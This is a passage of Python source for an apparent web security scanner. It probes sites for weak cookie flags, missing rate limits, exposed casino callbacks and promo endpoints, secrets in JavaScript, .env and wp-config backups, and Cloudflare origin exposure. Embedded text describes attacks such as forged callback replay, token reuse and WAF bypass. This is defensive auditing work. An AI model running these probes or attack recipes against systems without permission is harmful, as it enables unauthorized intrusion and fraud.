                "id": f"cookie_{cookie_name or 'unknown'}",
                "name": f"Insecure Cookie Flags — {label}",
                "category": "Session Security",
                "severity": severity_base,
                "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"{'Steal the ' + label + ' session token via XSS (document.cookie) because HttpOnly is not set. ' if not has_httponly else ''}"
                    f"{'Intercept the cookie over HTTP connections because Secure flag is missing. ' if not has_secure else ''}"
                    f"{'Perform CSRF attacks — the cookie is sent on cross-site requests because SameSite is not set. ' if not has_samesite else ''}"
                ).strip(),
                "attacker_cannot": None,
                "recommendation": f"Set cookie flags: Set-Cookie: {cookie_name}=...; HttpOnly; Secure; SameSite=Strict",
                "detail": f"Cookie {label}: {', '.join(issues)}",
                "burp": BURP_COOKIE,
            })

    if not findings:
        raw_name = raw_cookies.split("=")[0].strip() if raw_cookies else "session"
        findings.append({
            "id": "cookie_security",
            "name": "Cookie Security Flags",
            "category": "Session Security",
            "severity": "info",
            "status": "protected",
            "matched_at": url,
            "attacker_can": None,
            "attacker_cannot": "Steal or misuse session cookies via XSS or CSRF — HttpOnly, Secure and SameSite flags are correctly set.",
            "recommendation": None,
            "detail": "Session cookies have correct security flags.",
            "burp": None,
        })
    return findings


def _check_rate_limiting(url: str) -> dict:
    """Send 12 rapid requests and check for rate limiting signals."""
    base = {
        "id": "rate_limiting",
        "name": "Rate Limiting / Brute Force Protection",
        "category": "Access Control",
        "burp": BURP_RATE_LIMIT,
    }
    rate_limited = False
    detail_parts = []
    try:
        for i in range(12):
            req = urllib.request.Request(url, headers={"User-Agent": f"CyberScan/1.0 probe-{i}"})
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    h = {k.lower(): v for k, v in resp.headers.items()}
                    if resp.status == 429:
                        rate_limited = True
                        detail_parts.append(f"HTTP 429 on request {i+1}")
                        break
                    if any(k.startswith("x-ratelimit") or k == "retry-after" for k in h):
                        rate_limited = True
                        rl_headers = {k: v for k, v in h.items() if "ratelimit" in k or k == "retry-after"}
                        detail_parts.append(f"Rate limit headers: {rl_headers}")
                        break
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    rate_limited = True
                    detail_parts.append(f"HTTP 429 on request {i+1}")
                    break

        if rate_limited:
            return {**base, "severity": "info", "status": "protected",
                    "matched_at": url,
                    "attacker_can": None,
                    "attacker_cannot": "Brute force login, OTP, or promo code endpoints without being throttled — rate limiting is active.",
                    "recommendation": None,
                    "detail": f"Rate limiting detected: {'; '.join(detail_parts)}"}
        else:
            return {**base, "severity": "high", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": "Brute force login passwords, enumerate OTP codes, or cycle through promo/bonus codes at unlimited speed using Burp Intruder — 12 rapid requests received no throttling, 429 response, or rate-limit headers.",
                    "attacker_cannot": None,
                    "recommendation": "Implement rate limiting on authentication and sensitive endpoints: max 5 attempts per minute per IP. Return HTTP 429 with Retry-After header. Consider CAPTCHA after 3 failures.",
                    "detail": "12 rapid requests sent — no HTTP 429, no X-RateLimit-*, no Retry-After header detected."}
    except Exception as e:
        return {**base, "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": None,
                "recommendation": None,
                "detail": f"Rate limit check skipped: {e}"}


def _check_promo_endpoints(base_url: str) -> list:
    """Probe for exposed promo, bonus, coupon and referral endpoints."""
    paths = [
        ("/promo", "Promo Endpoint"),
        ("/promotion", "Promotion Endpoint"),
        ("/promotions", "Promotions Endpoint"),
        ("/bonus", "Bonus Endpoint"),
        ("/bonuses", "Bonuses Endpoint"),
        ("/coupon", "Coupon Endpoint"),
        ("/coupons", "Coupons Endpoint"),
        ("/voucher", "Voucher Endpoint"),
        ("/vouchers", "Vouchers Endpoint"),
        ("/referral", "Referral Endpoint"),
        ("/referrals", "Referrals Endpoint"),
        ("/api/promo", "API Promo Endpoint"),
        ("/api/bonus", "API Bonus Endpoint"),
        ("/api/coupon", "API Coupon Endpoint"),
        ("/api/voucher", "API Voucher Endpoint"),
        ("/api/referral", "API Referral Endpoint"),
        ("/api/v1/promo", "API v1 Promo Endpoint"),
        ("/api/v1/bonus", "API v1 Bonus Endpoint"),
        ("/api/v1/coupon", "API v1 Coupon Endpoint"),
        ("/api/v2/promo", "API v2 Promo Endpoint"),
        ("/api/v2/bonus", "API v2 Bonus Endpoint"),
        ("/reward", "Reward Endpoint"),
        ("/rewards", "Rewards Endpoint"),
        ("/free-bet", "Free Bet Endpoint"),
        ("/freebet", "Free Bet Endpoint"),
        ("/cashback", "Cashback Endpoint"),
        ("/loyalty", "Loyalty Program Endpoint"),
        ("/redeem", "Redeem Endpoint"),
        ("/claim", "Claim Endpoint"),
    ]
    findings = []
    base = base_url.rstrip("/")
    # Fingerprint homepage to detect soft 404s
    _, homepage_body, _ = _fetch_body(base)
    homepage_len = len(homepage_body)

    for path, label in paths:
        status, body, headers = _fetch_body(base + path, timeout=5)

        # Only care about 200/201 responses
        if status not in (200, 201):
            continue

        # Skip soft 404s
        if _is_soft_404(body, status, path):
            continue

        # Skip if body matches homepage length (SPA catchall returning homepage)
        if homepage_len > 0 and abs(len(body) - homepage_len) < 500:
            continue

        content_type = headers.get("content-type", "").lower()
        is_json = "json" in content_type or (body.strip().startswith(("{", "[")))

        # For API paths (/api/...) only flag if it's actually returning JSON
        if "/api/" in path and not is_json:
            continue

        # Check if body contains promo-related data
        interesting = is_json or any(kw in body.lower() for kw in
                      ["code", "promo", "bonus", "amount", "credit", "token",
                       "expire", "valid", "coupon", "voucher", "reward", "freebet"])

        if not interesting:
            continue

        findings.append({
            "id": f"promo_{path.strip('/').replace('/', '_')}",
            "name": f"Exposed {label}: {path}",
            "category": "Business Logic / Promo Exposure",
            "severity": "high" if is_json else "medium",
            "status": "vulnerable",
            "matched_at": base + path,
            "attacker_can": (
                f"Access {path} which returned HTTP {status} with {'JSON API data' if is_json else 'promo-related content'}. "
                f"{'An attacker can enumerate promo codes, harvest active bonuses, or replay redemption requests to claim credits at scale without authentication.' if is_json else 'This endpoint exposes promo logic that can be reverse-engineered and abused for free credits or bonus fraud.'}"
            ),
            "attacker_cannot": None,
            "recommendation": f"Require authentication on {path}. Implement rate limiting. Validate redemption server-side — one-time use, per-account limits, expiry checks. Never expose promo codes or amounts in unauthenticated responses.",
            "detail": f"HTTP {status} | {'JSON response' if is_json else 'HTML with promo keywords'} | {body[:150].strip()}",
            "burp": BURP_PROMO,
        })
    return findings


def _check_js_secrets(url: str) -> list:
    """Fetch the homepage, extract JS files, scan for hardcoded secrets."""
    import re as _re
    findings = []

    SECRET_PATTERNS = [
        (_re.compile(r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,64})["\']'), "API Key"),
        (_re.compile(r'(?i)(secret[_-]?key|client[_-]?secret)\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,64})["\']'), "Secret Key"),
        (_re.compile(r'(?i)(access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']([A-Za-z0-9_\-\.]{16,128})["\']'), "Access Token"),
        (_re.compile(r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']([^\'"]{6,64})["\']'), "Hardcoded Password"),
        (_re.compile(r'(?i)(aws_access_key_id|aws_secret)\s*[:=]\s*["\']([A-Za-z0-9/+=]{16,64})["\']'), "AWS Credential"),
        (_re.compile(r'(?i)Bearer\s+([A-Za-z0-9_\-\.]{20,})', ), "Bearer Token"),
        (_re.compile(r'(?i)(stripe[_-]?(?:live|secret)[_-]?key)\s*[:=]\s*["\']([A-Za-z0-9_]{20,})["\']'), "Stripe Live Key"),
        (_re.compile(r'(?i)(firebase[_-]?(?:api[_-]?key|token))\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']'), "Firebase Key"),
        # Stripe TEST key — payment gateway running in test mode on live site
        (_re.compile(r'(pk_test_[A-Za-z0-9]{20,})'), "Stripe Test Publishable Key"),
        (_re.compile(r'(sk_test_[A-Za-z0-9]{20,})'), "Stripe Test Secret Key"),
        # Plaintext password returned in server response and set into a form field
        # Pattern: .val(response) or .value = response used on a password field
        (_re.compile(r'(?i)["\']#?password["\'].*?\.val\s*\(\s*response\s*\)'), "Plaintext Password in Server Response"),
        (_re.compile(r'(?i)getElementById\s*\(["\']password["\']\).*?\.value\s*=\s*(?:data|response|result)'), "Plaintext Password in Server Response"),
    ]

    try:
        # Fetch homepage
        req = urllib.request.Request(url, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            html = resp.read(200000).decode("utf-8", errors="ignore")

        # Extract JS file URLs
        import re as _re2
        js_urls = _re2.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, _re2.IGNORECASE)
        from urllib.parse import urljoin, urlparse
        parsed_base = urlparse(url)
        base_domain = f"{parsed_base.scheme}://{parsed_base.netloc}"

        js_full_urls = []
        for js in js_urls[:15]:  # cap at 15 JS files
            full = urljoin(base_domain, js)
            if urlparse(full).netloc == parsed_base.netloc:
                js_full_urls.append(full)

        # Scan each JS file
        secrets_found = []
        for js_url in js_full_urls:
            try:
                req2 = urllib.request.Request(js_url, headers={"User-Agent": "CyberScan/1.0 Security Audit"})
                with urllib.request.urlopen(req2, timeout=8) as r:
                    js_content = r.read(500000).decode("utf-8", errors="ignore")

                for pattern, label in SECRET_PATTERNS:
                    for m in pattern.finditer(js_content):
                        groups = m.groups()
                        value = groups[-1] if groups else m.group(0)
                        # Skip obvious placeholders
                        if value.lower() in ("your_api_key", "xxxx", "example", "placeholder", "your_token", "secret"):
                            continue
                        secrets_found.append({
                            "label": label,
                            "value": value[:8] + "..." + value[-4:] if len(value) > 16 else value,
                            "file": js_url.split("/")[-1],
                        })
            except Exception:
                pass

        if secrets_found:
            # Deduplicate by label+file
            seen = set()
            unique = []
            for s in secrets_found:
                key = (s["label"], s["file"])
                if key not in seen:
                    seen.add(key)
                    unique.append(s)

            detail_lines = [f"{s['label']} in {s['file']}: {s['value']}" for s in unique[:6]]
            findings.append({
                "id": "js_secrets",
                "name": f"Hardcoded Secrets in JavaScript ({len(unique)} found)",
                "category": "Information Disclosure / Secret Leakage",
                "severity": "critical",
                "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"Read {len(unique)} hardcoded secret(s) directly from your JavaScript source files — "
                    "no authentication required, no hacking needed. These credentials can be used to access your APIs, "
                    "payment gateways, databases, or cloud infrastructure as if the attacker were your own application."
                ),
                "attacker_cannot": None,
                "recommendation": "Remove all secrets from client-side JavaScript immediately. Move API calls server-side. Use environment variables on the backend. Rotate any exposed credentials immediately.",
                "detail": " | ".join(detail_lines),
                "burp": BURP_JS_SECRET,
            })
        else:
            findings.append({
                "id": "js_secrets",
                "name": "JavaScript Secret Scan",
                "category": "Information Disclosure / Secret Leakage",
                "severity": "info",
                "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": f"Find hardcoded API keys, tokens or passwords in JavaScript files — {len(js_full_urls)} JS file(s) scanned, no secrets detected.",
                "recommendation": None,
                "detail": f"Scanned {len(js_full_urls)} JS file(s): no hardcoded secrets found.",
                "burp": None,
            })
    except Exception as e:
        findings.append({
            "id": "js_secrets",
            "name": "JavaScript Secret Scan",
            "category": "Information Disclosure / Secret Leakage",
            "severity": "info",
            "status": "protected",
            "matched_at": url,
            "attacker_can": None,
            "attacker_cannot": None,
            "recommendation": None,
            "detail": f"JS secret scan skipped: {e}",
            "burp": None,
        })
    return findings


def _check_subdomains(url: str) -> list:
    """Probe common subdomains for exposed services."""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    hostname = parsed.hostname or ""
    scheme = parsed.scheme

    # Strip www. to get root domain
    root = hostname
    if root.startswith("www."):
        root = root[4:]

    SUBDOMAINS = [
        "api", "admin", "staging", "stage", "dev", "development",
        "test", "beta", "portal", "dashboard", "manage", "management",
        "secure", "pay", "payments", "checkout", "shop",
        "internal", "backend", "services", "mobile", "m",
        "old", "legacy", "v1", "v2",
    ]

    findings = []
    for sub in SUBDOMAINS:
        fqdn = f"{sub}.{root}"
        if fqdn == hostname:
            continue
        target = f"{scheme}://{fqdn}"
        try:
            # DNS check first (fast fail)
            socket.getaddrinfo(fqdn, None, socket.AF_INET)
            # If DNS resolves, try HTTP
            status, body, hdrs = _fetch_body(target, timeout=5)
            server = hdrs.get("server", "")

            if status not in (0,) and status < 500 and not _is_soft_404(body, status, "/"):
                is_sensitive = sub in ("admin", "internal", "backend", "manage", "management", "staging", "dev", "development", "test")
                findings.append({
                    "id": f"subdomain_{sub}",
                    "name": f"Live Subdomain: {fqdn}",
                    "category": "Subdomain / Attack Surface",
                    "severity": "high" if is_sensitive else "medium",
                    "status": "vulnerable",
                    "matched_at": target,
                    "attacker_can": (
                        f"Access {target} (HTTP {status}) — {'this is a sensitive subdomain (' + sub + ') that likely has relaxed security, debug endpoints, or admin interfaces without WAF protection.' if is_sensitive else 'this subdomain expands the attack surface and may run older software versions or have different security policies than the main site.'}"
                    ),
                    "attacker_cannot": None,
                    "recommendation": f"{'Restrict access to ' + fqdn + ' by IP allowlist or VPN — it should never be publicly accessible.' if is_sensitive else 'Ensure ' + fqdn + ' has the same security headers, TLS config and WAF rules as the main domain.'}",
                    "detail": f"DNS resolves + HTTP {status} from {fqdn}" + (f" (Server: {server})" if server else ""),
                    "burp": BURP_SUBDOMAIN,
                })
        except (socket.gaierror, socket.herror, OSError):
            pass  # DNS not found — not a finding
        except Exception:
            pass
    return findings


BURP_ORIGIN_IP = {
    "tool": "Burp Suite + Shodan/SecurityTrails",
    "how": "The attacker queries SecurityTrails or Shodan for historical DNS A records of the domain. Old records often reveal the real origin server IP before Cloudflare was added. They then send requests directly to that IP with a spoofed Host header — completely bypassing Cloudflare's WAF, DDoS protection, and rate limiting. Every check that failed against the Cloudflare proxy now succeeds against the naked origin.",
    "academy_topic": "Information disclosure",
    "academy_path": "https://portswigger.net/web-security/information-disclosure",
}

BURP_CALLBACK = {
    "tool": "Burp Suite Repeater + Intruder",
    "how": "The attacker intercepts a game provider callback (e.g. Pragmatic Play sending 'player won €500') using Burp Proxy. They replay it in Repeater — if the operator doesn't validate the HMAC signature or check for duplicate transaction IDs, the wallet credits the player twice. Intruder automates replaying hundreds of winning callbacks to drain the operator's wallet.",
    "academy_topic": "Business logic vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/logic-flaws",
}

BURP_SESSION_TOKEN = {
    "tool": "Burp Suite Repeater",
    "how": "The attacker intercepts the game launch URL containing a session token (e.g. /game/launch?token=abc123). They send it to Burp Repeater and replay it after it should have expired. If it still works, they can reuse tokens from other players' sessions — loading games on their balance without authentication.",
    "academy_topic": "Authentication vulnerabilities",
    "academy_path": "https://portswigger.net/web-security/authentication",
}


def _check_origin_ip(url: str) -> dict:
    """Try to find the real origin IP behind Cloudflare via DNS + certificate history."""
    from urllib.parse import urlparse
    base = {
        "id": "origin_ip",
        "name": "Real Origin IP Exposure (Cloudflare Bypass)",
        "category": "Infrastructure / Cloudflare Bypass",
        "burp": BURP_ORIGIN_IP,
    }
    parsed = urlparse(url)
    hostname = parsed.hostname or ""
    try:
        ip = socket.gethostbyname(hostname)
        cf_ranges = _CF_IP_RANGES  # reuse existing Cloudflare IP list
        is_cf = any(ip.startswith(p) for p in cf_ranges)

        if not is_cf:
            return {**base,
                "severity": "high", "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"Connect directly to the origin server at {ip} — Cloudflare is NOT in front of "
                    "this IP. All WAF protection, rate limiting and DDoS mitigation is bypassed. "
                    "The attacker hits the raw server with no restrictions."
                ),
                "attacker_cannot": None,
                "recommendation": "Route ALL traffic through Cloudflare. Block direct access to origin IP using firewall rules — only allow inbound connections from Cloudflare IP ranges.",
                "detail": f"Origin IP {ip} is not a Cloudflare address — direct server access possible.",
            }
        else:
            # Check common subdomains that may bypass Cloudflare
            bypass_subs = ["direct", "origin", "backend", "mail", "ftp", "cpanel", "webmail"]
            exposed = []
            for sub in bypass_subs:
                try:
                    sub_ip = socket.gethostbyname(f"{sub}.{hostname}")
                    if not any(sub_ip.startswith(p) for p in cf_ranges):
                        exposed.append(f"{sub}.{hostname} -> {sub_ip}")
                except Exception:
                    pass
            if exposed:
                return {**base,
                    "severity": "high", "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": (
                        "Bypass Cloudflare by connecting to a non-proxied subdomain that resolves "
                        f"to the real origin IP: {', '.join(exposed)}. From there, all Cloudflare "
                        "protections are bypassed completely."
                    ),
                    "attacker_cannot": None,
                    "recommendation": "Ensure ALL subdomains are proxied through Cloudflare (orange cloud in DNS). Block origin server from accepting direct connections.",
                    "detail": f"Non-Cloudflare subdomains found: {', '.join(exposed)}",
                }
            return {**base,
                "severity": "info", "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": "Bypass Cloudflare via direct IP — origin is fully proxied and no exposed subdomains found.",
                "recommendation": None,
                "detail": f"Origin IP {ip} is a Cloudflare address. No bypass subdomains detected.",
            }
    except Exception as e:
        return {**base,
            "severity": "info", "status": "protected",
            "matched_at": url, "attacker_can": None, "attacker_cannot": None,
            "recommendation": None, "detail": f"Origin IP check skipped: {e}",
        }


def _check_provider_callbacks(url: str) -> list:
    """Check for exposed game provider callback/webhook endpoints."""
    from urllib.parse import urlparse
    base_url = url.rstrip("/")
    findings = []

    callback_paths = [
        ("/callback", "Game Provider Callback"),
        ("/webhook", "Webhook Endpoint"),
        ("/api/callback", "API Callback"),
        ("/api/webhook", "API Webhook"),
        ("/game/callback", "Game Callback"),
        ("/casino/callback", "Casino Callback"),
        ("/provider/callback", "Provider Callback"),
        ("/wallet/callback", "Wallet Callback"),
        ("/transaction/callback", "Transaction Callback"),
        ("/pragmatic/callback", "Pragmatic Play Callback"),
        ("/evolution/callback", "Evolution Gaming Callback"),
        ("/netent/callback", "NetEnt Callback"),
        ("/notify", "Payment Notification"),
        ("/ipn", "Instant Payment Notification"),
        ("/payment/notify", "Payment Notify"),
        ("/deposit/callback", "Deposit Callback"),
        ("/withdraw/callback", "Withdrawal Callback"),
    ]

    _, homepage_body, _ = _fetch_body(base_url)
    homepage_len = len(homepage_body)

    for path, label in callback_paths:
        status, body, headers = _fetch_body(base_url + path, timeout=5)
        if status not in (200, 201, 405, 403):
            continue
        if status == 200 and _is_soft_404(body, status, path):
            continue
        if status == 200 and abs(len(body) - homepage_len) < 500:
            continue

        content_type = headers.get("content-type", "").lower()
        is_json = "json" in content_type or body.strip().startswith(("{", "["))

        # 405 = Method Not Allowed = endpoint EXISTS but needs POST
        # 403 = Forbidden = endpoint exists but protected
        if status == 405:
            findings.append({
                "id": f"callback_{path.strip('/').replace('/', '_')}",
                "name": f"Game Provider Callback Endpoint Found: {path}",
                "category": "Casino Business Logic",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": base_url + path,
                "attacker_can": (
                    f"Confirm {path} exists (HTTP 405 = endpoint live, needs POST). "
                    "If HMAC signature validation is missing or weak, an attacker can POST a forged "
                    "winning transaction callback — crediting their account with fake winnings without playing."
                ),
                "attacker_cannot": None,
                "recommendation": "Validate ALL provider callbacks with HMAC-SHA256 signature. Verify transaction IDs are unique and not replayable. Whitelist provider IPs.",
                "detail": f"HTTP 405 from {path} — endpoint exists, requires POST method.",
                "burp": BURP_CALLBACK,
            })
        elif status in (200, 201) and is_json:
            findings.append({
                "id": f"callback_{path.strip('/').replace('/', '_')}",
                "name": f"Exposed Callback Endpoint Returns Data: {path}",
                "category": "Casino Business Logic",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": base_url + path,
                "attacker_can": (
                    f"Access {path} which returned JSON data unauthenticated. "
                    "This callback endpoint may accept forged transaction data from anyone — "
                    "not just the game provider. An attacker can POST fake winning callbacks to credit "
                    "their account without HMAC validation."
                ),
                "attacker_cannot": None,
                "recommendation": "Immediately restrict this endpoint to provider IP ranges only. Implement HMAC-SHA256 signature validation on every callback.",
                "detail": f"HTTP {status} JSON response from {path}: {body[:100]}",
                "burp": BURP_CALLBACK,
            })
    return findings


def _check_session_tokens(url: str) -> list:
    """Look for game launch endpoints and check for token exposure."""
    from urllib.parse import urlparse
    base_url = url.rstrip("/")
    findings = []

    token_paths = [
        ("/game/launch", "Game Launch"),
        ("/games/launch", "Games Launch"),
        ("/casino/launch", "Casino Launch"),
        ("/play", "Play Endpoint"),
        ("/api/game/launch", "API Game Launch"),
        ("/api/session", "API Session"),
        ("/api/token", "API Token"),
        ("/launch", "Launch Endpoint"),
    ]

    _, homepage_body, _ = _fetch_body(base_url)
    homepage_len = len(homepage_body)

    for path, label in token_paths:
        status, body, headers = _fetch_body(base_url + path, timeout=5)
        if status not in (200, 201, 400, 405):
            continue
        if status == 200 and _is_soft_404(body, status, path):
            continue
        if status == 200 and abs(len(body) - homepage_len) < 500:
            continue

        content_type = headers.get("content-type", "").lower()
        is_json = "json" in content_type or body.strip().startswith(("{", "["))

        token_keywords = ["token", "session", "launch_url", "gameurl", "game_url", "sessionid"]
        has_token_data = any(kw in body.lower() for kw in token_keywords)

        if status in (200, 201) and (is_json or has_token_data):
            findings.append({
                "id": f"session_{path.strip('/').replace('/', '_')}",
                "name": f"Game Session/Token Endpoint Exposed: {path}",
                "category": "Casino Business Logic",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": base_url + path,
                "attacker_can": (
                    f"Access {path} which returns session or token data unauthenticated. "
                    "Game session tokens can be replayed to load games on other players' balances, "
                    "or extracted and reused after they should have expired."
                ),
                "attacker_cannot": None,
                "recommendation": "Require authentication on all game launch endpoints. Make tokens single-use and short-lived (max 5 minutes). Log and alert on token reuse attempts.",
                "detail": f"HTTP {status} from {path} contains token/session data: {body[:100]}",
                "burp": BURP_SESSION_TOKEN,
            })
        elif status == 400 and is_json:
            findings.append({
                "id": f"session_{path.strip('/').replace('/', '_')}",
                "name": f"Game Launch Endpoint Active: {path}",
                "category": "Casino Business Logic",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": base_url + path,
                "attacker_can": (
                    f"{path} is live and responding to requests (HTTP 400 = endpoint exists, needs correct params). "
                    "An attacker can probe this endpoint with different parameters to attempt session hijacking "
                    "or token reuse on other players' game sessions."
                ),
                "attacker_cannot": None,
                "recommendation": "Ensure all game launch tokens are single-use, tied to authenticated sessions, and expire within 5 minutes.",
                "detail": f"HTTP 400 JSON from {path} — endpoint active, requires valid parameters.",
                "burp": BURP_SESSION_TOKEN,
            })
    return findings


def _check_wordpress(url: str) -> list:
    """Check for WordPress/WooCommerce specific vulnerabilities."""
    findings = []
    base = url.rstrip("/")

    wp_checks = [
        # WooCommerce REST API — unauthenticated order/customer data
        ("/wp-json/wc/v3/orders",     "critical", "WooCommerce Orders API Open",
         "All customer orders (names, addresses, emails, purchase history) are readable by anyone without authentication."),
        ("/wp-json/wc/v3/customers",  "critical", "WooCommerce Customers API Open",
         "All customer accounts (names, emails, addresses, billing info) are readable without authentication."),
        ("/wp-json/wc/v3/products",   "medium",   "WooCommerce Products API Open",
         "Full product/pricing data is publicly accessible via API — can be used for competitor scraping or price manipulation research."),
        # WordPress user enumeration
        ("/wp-json/wp/v2/users",      "high",     "WordPress User Enumeration",
         "All WordPress usernames and display names are exposed — attackers use these for targeted brute force or phishing."),
        # Debug/backup files
        ("/wp-content/debug.log",     "critical", "WordPress Debug Log Exposed",
         "Full application error log is publicly readable — leaks file paths, database errors, plugin names, and sometimes credentials."),
        ("/wp-config.php.bak",        "critical", "WordPress Config Backup Exposed",
         "Backup of wp-config.php may contain database credentials, secret keys, and table prefix."),
        ("/wp-config.php~",           "critical", "WordPress Config Backup Exposed",
         "Backup of wp-config.php may contain database credentials and secret keys."),
        ("/.env",                     "critical", "Environment File Exposed",
         "The .env file contains database passwords, API keys, and secret tokens in plain text."),
        # XML-RPC (brute force amplification)
        ("/xmlrpc.php",               "high",     "WordPress XML-RPC Enabled",
         "XML-RPC allows attackers to test thousands of username/password combinations in a single request, bypassing rate limits."),
        # Login page
        ("/wp-login.php",             "medium",   "WordPress Login Page Exposed",
         "WordPress admin login is publicly accessible and can be brute-forced."),
    ]

    for path, severity, name, detail in wp_checks:
        try:
            status, body, resp_headers = _fetch_body(base + path)
            ct = resp_headers.get("content-type", "")

            # Skip soft 404s
            if _is_soft_404(body, status, path):
                continue

            # WooCommerce API — must return JSON with actual data
            if "wc/v3" in path:
                if status == 200 and "application/json" in ct:
                    try:
                        data = json.loads(body)
                        if isinstance(data, list) and len(data) > 0:
                            findings.append({
                                "id": f"woo_{path.split('/')[-1]}",
                                "name": name,
                                "category": "WooCommerce / WordPress",
                                "severity": severity,
                                "status": "vulnerable",
                                "matched_at": base + path,
                                "attacker_can": detail,
                                "attacker_cannot": None,
                                "recommendation": "Restrict WooCommerce REST API to authenticated users only. Add `require_login` to REST API settings or use a security plugin.",
                                "detail": f"API returned {len(data)} records without authentication.",
                            })
                    except Exception:
                        pass
                continue

            # WordPress users — must return JSON array
            if "wp/v2/users" in path:
                if status == 200 and "application/json" in ct:
                    try:
                        data = json.loads(body)
                        if isinstance(data, list) and len(data) > 0:
                            users = [u.get("slug", u.get("name", "?")) for u in data[:5]]
                            findings.append({
                                "id": "wp_user_enum",
                                "name": name,
                                "category": "WooCommerce / WordPress",
                                "severity": severity,
                                "status": "vulnerable",
                                "matched_at": base + path,
                                "attacker_can": detail,
                                "attacker_cannot": None,
                                "recommendation": "Disable user enumeration via REST API. Add `remove_action('rest_api_init', ...)` or use a security plugin like Wordfence.",
                                "detail": f"Exposed usernames: {', '.join(users)}",
                            })
                    except Exception:
                        pass
                continue

            # Debug log / backup files — any 200 with content
            if status == 200 and len(body) > 50:
                findings.append({
                    "id": f"wp_{path.split('/')[-1].replace('.', '_')}",
                    "name": name,
                    "category": "WooCommerce / WordPress",
                    "severity": severity,
                    "status": "vulnerable",
                    "matched_at": base + path,
                    "attacker_can": detail,
                    "attacker_cannot": None,
                    "recommendation": "Delete or restrict access to this file immediately via .htaccess or server config.",
                    "detail": f"HTTP {status} — {len(body)} bytes returned.",
                })

        except Exception:
            continue

    return findings


# ---------------------------------------------------------------------------
# Directory listing detection
# ---------------------------------------------------------------------------

def _check_directory_listing(base_url: str) -> list:
    """
    Probe common paths for Apache/nginx directory listing ('Index of /').
    These expose the full file tree — config files, backups, upload dirs.
    """
    import re as _re
    from urllib.parse import urljoin

    PATHS = [
        "/", "/uploads/", "/upload/", "/files/", "/images/", "/assets/",
        "/backup/", "/backups/", "/logs/", "/log/", "/tmp/", "/temp/",
        "/API/", "/API/POST/", "/api/", "/static/", "/media/", "/data/",
        "/includes/", "/inc/", "/js/", "/css/", "/menus/", "/docs/",
        "/config/", "/admin/", "/old/", "/archive/", "/exports/",
    ]

    DIR_LISTING_PATTERNS = [
        _re.compile(r'<title>Index of /', _re.IGNORECASE),
        _re.compile(r'<h1>Index of /', _re.IGNORECASE),
        _re.compile(r'Directory listing for /', _re.IGNORECASE),
        _re.compile(r'\[To Parent Directory\]', _re.IGNORECASE),
    ]

    findings = []
    exposed = []

    for path in PATHS:
        target = urljoin(base_url, path)
        try:
            req = urllib.request.Request(
                target,
                headers={"User-Agent": "CyberScan/1.0 Security Audit"},
                method="GET",
            )
            with urllib.request.urlopen(req, timeout=6) as r:
                if r.status not in (200, 206):
                    continue
                body = r.read(8000).decode("utf-8", errors="ignore")
                for pat in DIR_LISTING_PATTERNS:
                    if pat.search(body):
                        exposed.append(path)
                        break
        except Exception:
            pass

    if exposed:
        findings.append({
            "id": "directory_listing",
            "name": f"Directory Listing Enabled ({len(exposed)} path{'s' if len(exposed) > 1 else ''})",
            "category": "Information Disclosure / Misconfiguration",
            "severity": "high",
            "status": "vulnerable",
            "matched_at": base_url,
            "attacker_can": (
                f"Browse your server's file system like a public folder — {len(exposed)} director{'ies' if len(exposed) > 1 else 'y'} "
                f"({', '.join(exposed[:5])}) expose every file they contain. "
                "An attacker can download PHP source code, config files, database backups, uploaded documents, "
                "and any file stored on the server — with no authentication and no hacking required."
            ),
            "attacker_cannot": None,
            "recommendation": (
                "Disable directory listing in your web server config. "
                "Apache: add 'Options -Indexes' to .htaccess or httpd.conf. "
                "Nginx: remove 'autoindex on' from your location blocks. "
                "Add a default index.html to any directory that must remain accessible."
            ),
            "detail": f"Directory listing active at: {', '.join(exposed)}",
            "burp": BURP_DIR_LISTING,
        })
    else:
        findings.append({
            "id": "directory_listing",
            "name": "Directory Listing Disabled",
            "category": "Information Disclosure / Misconfiguration",
            "severity": "info",
            "status": "protected",
            "matched_at": base_url,
            "attacker_can": None,
            "attacker_cannot": "Browse server directories — no directory listing pages detected across common paths.",
            "recommendation": None,
            "detail": f"Tested {len(PATHS)} paths — no open directory listings found.",
            "burp": None,
        })

    return findings


# ---------------------------------------------------------------------------
# Unauthenticated file upload endpoint detection
# ---------------------------------------------------------------------------

def _check_unauthenticated_upload(base_url: str) -> list:
    """
    Probe for file upload endpoints that respond without authentication.
    A 200/405 response (rather than 401/403/404) suggests the endpoint exists
    and may accept uploads without auth checks.
    """
    from urllib.parse import urljoin

    UPLOAD_PATHS = [
        "/upload.php", "/uploadPDF.php", "/fileupload.php", "/file_upload.php",
        "/upload/", "/upload.asp", "/upload.aspx", "/uploader.php",
        "/API/POST/uploadPDF.php", "/API/POST/upload.php", "/api/upload",
        "/api/v1/upload", "/api/v2/upload", "/media/upload", "/files/upload",
        "/admin/upload.php", "/admin/upload", "/cms/upload.php",
        "/wp-content/uploads/", "/wp-admin/async-upload.php",
        "/attachments/upload", "/documents/upload", "/images/upload",
    ]

    findings = []
    found = []

    for path in UPLOAD_PATHS:
        target = urljoin(base_url, path)
        try:
            # HEAD first to check existence without triggering errors
            req = urllib.request.Request(
                target,
